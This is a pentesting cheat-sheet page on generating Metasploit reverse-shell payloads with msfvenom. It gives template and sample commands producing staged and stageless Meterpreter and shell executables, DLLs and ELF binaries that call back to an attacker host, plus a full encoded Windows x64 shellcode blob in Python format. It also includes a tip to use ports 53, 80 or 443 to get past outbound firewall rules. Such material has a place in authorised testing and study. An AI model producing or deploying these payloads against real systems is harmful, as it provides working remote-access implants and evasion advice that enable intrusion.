---
title: "Metasploit Shellcode"
date: 2024-6-26
tags: ["Code Execution", "Metasploit", "Firewall", "Payload", "RCE", "Dll Hijacking", "Shellcode", "Reverse Shell", "Msfconsole", "Msfvenom"]
---

### Generate Shellcode

<small>*Note: stageless payload can catch with nc directly*</small>

#### Windows x64

{{< tab set1 tab1 >}}Staged exe{{< /tab >}}
{{< tab set1 tab2 >}}Stageless exe{{< /tab >}}
{{< tab set1 tab3 >}}Staged dll{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe
```

```console {class="sample-code"}
$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.31 LPORT=1337 > rev.exe
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe
```

```console {class="sample-code"}
$ msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.31 LPORT=1337 > rev.exe
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
```

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

```console
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.dll
```

```console {class="sample-code"}
$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.14.31 LPORT=1337 > rev.dll
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
```

{{< /tabcontent >}}

#### Windows x86

{{< tab set2 tab1 >}}Staged exe{{< /tab >}}
{{< tab set2 tab2 >}}Stageless exe{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe
```

```console {class="sample-code"}
$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.31 LPORT=1337 > rev.exe
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> EXITFUNC=thread > rev.exe
```

```console {class="sample-code"}
$ msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.31 LPORT=1337 EXITFUNC=thread > rev.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

{{< /tabcontent >}}

<small>*Note: These will be flagged by AV*</small>
<br>
<small>*Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules*</small>

#### Linux amd64

{{< tab set3 tab1 >}}Stageless elf{{< /tab >}}
{{< tabcontent set3 tab1 >}}

```console
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f elf > rev.elf
```

```console {class="sample-code"}
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.31 LPORT=1337 -f elf > rev.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

{{< /tabcontent >}}

#### Others

{{< tab set4 tab1 >}}Staged python{{< /tab >}}
{{< tabcontent set4 tab1 >}}

```console
# Generate shellcode in python format and avoid specific bytes
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f python -v shellcode --platform windows -b'\x00\x0a\0d' LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT>
```

```console {class="sample-code"}
$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f python -v shellcode --platform windows -b'\x00\x0a\0d' LHOST=10.10.14.31 LPORT=1337
Found 2 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 551 (iteration=0)
x64/xor chosen with final size 551
Payload size: 551 bytes
Final size of python file: 3088 bytes
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xc4\x65\xf0"
shellcode += b"\xfa\xa2\xb7\x5f\x27\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x38\x2d\x73\x1e\x52"
shellcode += b"\x5f\x93\x27\xc4\x65\xb1\xab\xe3\xe7\x0d\x76"
shellcode += b"\x92\x2d\xc1\x28\xc7\xff\xd4\x75\xa4\x2d\x7b"
shellcode += b"\xa8\xba\xff\xd4\x75\xe4\x28\xc1\x33\xea\x3c"
shellcode += b"\x2d\x77\x8c\x6a\x47\xb0\xe8\xff\x6e\xe7\x68"
shellcode += b"\x59\x91\x86\xa0\x9b\x7f\x66\x05\xac\xfd\xbb"
shellcode += b"\xa3\x76\xbd\xca\x96\x2d\x7b\xa8\x82\xf6\x0e"
shellcode += b"\xac\x86\x59\xb8\xfb\x72\xd1\xde\x5f\xdc\x6e"
shellcode += b"\xf2\xf5\x27\xc5\x5f\x27\xc4\xee\x70\x72\xa2"
shellcode += b"\xb7\x5f\x6f\x41\xa5\x84\x9d\xea\xb6\x8f\xac"
shellcode += b"\x8c\x7d\xa0\xbe\x29\xf7\x7f\x6e\xc5\xb5\x13"
shellcode += b"\xac\xea\x48\x96\x66\x4f\x51\x78\xb2\xa3\x61"
shellcode += b"\x12\x16\x0d\x2d\xc1\x3a\xe3\x76\x96\x2a\x68"
shellcode += b"\x24\xf1\x3b\x9a\x57\x2a\xd6\x88\x66\xbc\xde"
shellcode += b"\xaa\xf2\x66\xf6\xb1\xbd\xa8\xbe\x29\xf7\x7b"
shellcode += b"\x6e\xc5\xb5\x96\xbb\x29\xbb\x17\x63\x4f\x25"
shellcode += b"\xec\xb3\xa3\x67\x1e\xac\xc0\xed\xb8\xfb\x72"
shellcode += b"\xf6\x07\x66\x9c\x3b\xa9\xa0\xe3\xef\x1e\x7e"
shellcode += b"\x85\x3f\xb8\x79\x4e\x97\x1e\x75\x3b\x85\xa8"
shellcode += b"\xbb\xfb\xed\x17\xac\xd6\x8c\xbb\x05\x5d\x48"
shellcode += b"\x02\x6e\x7a\x12\x83\xc8\xfd\x84\x6d\x27\xc4"
shellcode += b"\x24\xa6\xb3\x2b\x51\x17\xa6\x28\xc5\xf1\xfa"
shellcode += b"\xa2\xfe\xd6\xc2\x8d\xd9\xf2\xfa\xa7\x8e\x55"
shellcode += b"\x2d\xca\x7a\xb1\xae\xeb\x3e\xbb\x6b\x4d\x94"
shellcode += b"\xb1\x40\xee\xc0\x79\x20\x3b\xb0\xbc\x73\x48"
shellcode += b"\xdf\x5e\x26\xc4\x65\xa9\xbb\x18\x9e\xdf\x4c"
shellcode += b"\xc4\x9a\x25\x90\xa8\xf6\x01\x77\x94\x28\xc1"
shellcode += b"\x33\xef\x86\x9f\x6f\x3b\xa5\xb8\x73\x60\xff"
shellcode += b"\xa0\xe7\x8c\xec\x31\xbb\x18\x5d\x50\xf8\x24"
shellcode += b"\x9a\x25\xb2\x2b\x70\x35\x37\x85\x3d\xbc\x73"
shellcode += b"\x40\xff\xd6\xde\x85\xdf\x69\x5f\xd6\xd6\xa0"
shellcode += b"\xf2\x41\xa5\x84\xf0\xeb\x48\x91\x52\x21\x8d"
shellcode += b"\x63\xfa\xa2\xb7\x17\xa4\x28\x75\xb8\x73\x40"
shellcode += b"\xfa\x6e\xee\xae\x61\xb1\xa2\xea\x3e\xa6\x66"
shellcode += b"\x7e\x67\x29\x32\xfd\x48\x8a\xa4\x3c\x65\x8e"
shellcode += b"\xaf\xea\x34\x9b\x07\x9a\xec\x06\x90\xe2\xf6"
shellcode += b"\x06\x4f\xc4\x75\xf0\xfa\xe3\xef\x17\xae\x36"
shellcode += b"\x2d\xc1\x33\xe3\x0d\x07\x83\x97\x80\x0f\x2f"
shellcode += b"\xea\x3e\x9c\x6e\x4d\xa2\xbd\xcb\x6b\xfe\xd6"
shellcode += b"\xd7\x8c\xec\x2a\xb2\x2b\x4e\x1e\x9d\xc6\xbc"
shellcode += b"\x38\xa5\x5d\x62\xdc\xdf\xc4\x18\xd8\xa2\xe3"
shellcode += b"\xe0\x06\x4f\xc4\x25\xf0\xfa\xe3\xef\x35\x27"
shellcode += b"\x9e\x24\x4a\xf1\x8d\xb8\x6f\xd8\x11\x32\xa9"
shellcode += b"\xbb\x18\xc2\x31\x6a\xa5\x9a\x25\xb3\x5d\x79"
shellcode += b"\xb6\x1b\x3b\x9a\x0f\xb2\xa3\x74\x17\x0e\x02"
shellcode += b"\x2d\x75\x0c\xd7\x03\x1e\xd8\x23\x3d\x9a\xfa"
shellcode += b"\xfb\xfe\x98\xe5\x34\xd0\x52\xac\x5d\x62\x5f"
shellcode += b"\x27"
```

{{< /tabcontent >}}
